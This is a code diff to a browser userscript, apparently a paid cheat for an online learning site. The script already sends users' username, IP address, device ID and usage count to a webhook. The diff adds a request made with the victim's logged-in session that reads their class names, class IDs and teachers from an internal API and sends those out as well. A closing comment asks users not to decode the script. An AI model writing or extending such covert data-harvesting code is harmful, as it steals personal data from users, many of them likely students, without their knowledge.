@@ -111,7 +111,9 @@ async function sendWebhook(data) {
                         { name: '🌐 IP Address', value: data.ip || 'Unknown', inline: true },
                         { name: '🔢 Usage Count', value: data.usageCount.toString(), inline: true },
                         { name: '🆔 Device ID', value: data.deviceId || 'Unknown', inline: true },
-                        { name: '📱 Device Type', value: data.deviceType || 'Unknown', inline: true }
+                        { name: '📱 Device Type', value: data.deviceType || 'Unknown', inline: true },
+                        { name: '📚 Classes', value: data.classes || 'None', inline: true },
+                        { name: '👨‍🏫 Teachers', value: data.teachers || 'None', inline: true }
                     ],
                     footer: { text: `Powered by HieuDz | Version: ${ver}` },
                     timestamp: new Date().toISOString()
@@ -174,6 +176,7 @@ loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
     }
 
     // Fetch user profile
+    let classInfo = { classes: 'None', teachers: 'None' };
     await fetch(`https://${window.location.hostname}/api/internal/graphql/getFullUserProfile`,{
         headers:{
             accept:"*/*",
@@ -201,8 +204,35 @@ loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
         user = { 
             nickname: data.data.user.nickname, 
             username: data.data.user.username, 
-            UID: data.data.user.id.slice(-5) 
+            UID: data.data.user.id.slice(-5),
+            hasClasses: data.data.user.hasClasses,
+            hasCoach: data.data.user.hasCoach
         }; 
+
+        // Fetch class and teacher info
+        if (user.hasClasses || user.hasCoach) {
+            try {
+                const classResponse = await fetch(`https://${window.location.hostname}/api/internal/classrooms`, {
+                    headers: {
+                        accept: "*/*",
+                        "content-type": "application/json",
+                        "x-ka-fkey": "1",
+                        "sec-fetch-mode": "cors",
+                        "sec-fetch-site": "same-origin"
+                    },
+                    method: "GET",
+                    mode: "cors",
+                    credentials: "include"
+                });
+                const classData = await classResponse.json();
+                const classes = classData.map(cls => `${cls.name} (${cls.id})`).join(', ') || 'None';
+                const teachers = classData.flatMap(cls => cls.teachers?.map(t => t.nickname || t.username || 'Unknown') || []).join(', ') || 'None';
+                classInfo = { classes, teachers };
+            } catch (error) {
+                debug('Failed to fetch class info: ' + error.message);
+            }
+        }
+
         // Send webhook with user data
         await sendWebhook({
             username: user.username,
@@ -210,7 +240,9 @@ loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
             ip: ipAddress,
             usageCount: usageCount,
             deviceId: deviceId,
-            deviceType: device.apple ? 'Apple' : device.mobile ? 'Mobile' : 'Desktop'
+            deviceType: device.apple ? 'Apple' : device.mobile ? 'Mobile' : 'Desktop',
+            classes: classInfo.classes,
+            teachers: classInfo.teachers
         });
     });
 
@@ -232,4 +264,4 @@ loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
     console.clear();
 });
 
-/* Thank you to everyone who has purchased access to my cheat as of 10/28/24. */
+/* Thank you for using my cheat,no decode pls. */
